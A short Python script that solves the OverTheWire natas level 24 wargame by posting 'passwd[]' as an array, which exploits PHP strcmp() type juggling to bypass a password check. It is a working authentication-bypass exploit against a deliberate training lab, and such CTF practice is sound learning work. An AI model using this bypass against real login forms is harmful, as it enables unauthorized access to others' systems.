"""
Help script to resolve natas challenge #24
"""
import requests
import json

level = 'natas24'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we use a exploit of the strcmp() function.
If the first parameter is not a string, it returns zero. Whaaaat????
"""
response = requests.post(url, data={"passwd[]": "0"}, auth=auth)
print(response.text)
